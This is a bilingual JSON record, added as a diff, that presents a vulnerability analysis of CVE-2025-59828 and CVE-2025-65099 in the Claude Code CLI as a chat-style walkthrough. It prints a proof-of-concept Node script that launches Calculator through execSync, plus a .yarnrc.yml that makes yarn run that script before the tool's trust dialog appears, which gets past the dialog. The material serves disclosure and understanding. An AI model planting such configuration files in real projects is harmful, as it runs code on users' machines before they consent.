@@ -1,0 +1,83 @@
+{
+  "_source_md": "AI-CLI/2026-03-26-claude-code-CVE-2025-59828-and-CVE-2025-65099.md",
+  "version": "claude-code-cve-2025-59828-65099",
+  "title": {
+    "zh": "CVE-2025-59828/CVE-2025-65099: Claude Code 启动信任对话框前的命令执行",
+    "en": "CVE-2025-59828/CVE-2025-65099: Command Execution Prior to Claude Code Startup Trust Dialog"
+  },
+  "description": {
+    "zh": "分析 Claude Code CLI 在启动信任对话框之前的命令执行漏洞，包括恶意 `.yarnrc.yml` 配置文件利用方式。",
+    "en": "Analysis of command execution vulnerabilities in Claude Code CLI before the startup trust dialog, including malicious `.yarnrc.yml` configuration file exploitation methods."
+  },
+  "steps": [
+    {
+      "type": "user_message",
+      "content": {
+        "zh": "分析 CVE-2025-59828 和 CVE-2025-65099 漏洞详情",
+        "en": "Analyze CVE-2025-59828 and CVE-2025-65099 vulnerability details"
+      },
+      "annotation": {
+        "zh": "用户请求分析 Claude Code 的安全漏洞",
+        "en": "User requests analysis of Claude Code security vulnerabilities"
+      }
+    },
+    {
+      "type": "system_event",
+      "content": {
+        "zh": "恶意 JavaScript 文件：",
+        "en": "Malicious JavaScript file:"
+      },
+      "codeBlocks": [
+        {
+          "language": "javascript",
+          "code": "#!/usr/bin/env node\nrequire('child_process').execSync('open -a Calculator');\nconsole.log('1.0.0');",
+          "caption": {
+            "zh": "执行计算器应用的恶意脚本",
+            "en": "Malicious script that executes Calculator app"
+          }
+        }
+      ],
+      "annotation": {
+        "zh": "系统事件：展示恶意代码",
+        "en": "System event: display malicious code"
+      }
+    },
+    {
+      "type": "system_event",
+      "content": {
+        "zh": "恶意 `.yarnrc.yml` 配置文件：",
+        "en": "Malicious .yarnrc.yml configuration file:"
+      },
+      "codeBlocks": [
+        {
+          "language": "yaml",
+          "code": "# 选项 1：执行自定义 yarn 二进制文件\nyarnPath: ./malicious.js\n\n# 选项 2：加载恶意插件\nplugins:\n  - path: ./malicious.js\n    spec: \"\"",
+          "caption": {
+            "zh": "通过 yarn 配置触发恶意代码执行",
+            "en": "Trigger malicious code execution via yarn configuration"
+          }
+        }
+      ],
+      "annotation": {
+        "zh": "系统事件：配置文件示例",
+        "en": "System event: configuration file example"
+      }
+    },
+    {
+      "type": "assistant_text",
+      "content": {
+        "zh": "这两个 CVE 涉及 Claude Code CLI 在启动信任对话框之前执行恶意代码的问题。攻击者可以通过恶意 .yarnrc.yml 配置文件触发命令执行。",
+        "en": "These two CVEs involve Claude Code CLI executing malicious code before the startup trust dialog. Attackers can trigger command execution through malicious .yarnrc.yml configuration files."
+      },
+      "annotation": {
+        "zh": "助手总结漏洞原理",
+        "en": "Assistant summarizes vulnerability principle"
+      }
+    },
+    {
+      "type": "tool_result",
+      "content": "![2026-03-26-12.31.51.png](https://image.isisy.com/images/2026/03/26/2026-03-26-12.31.51.png)",
+      "toolName": "CLI-LocalCommandExecute Pictures"
+    }
+  ]
+}
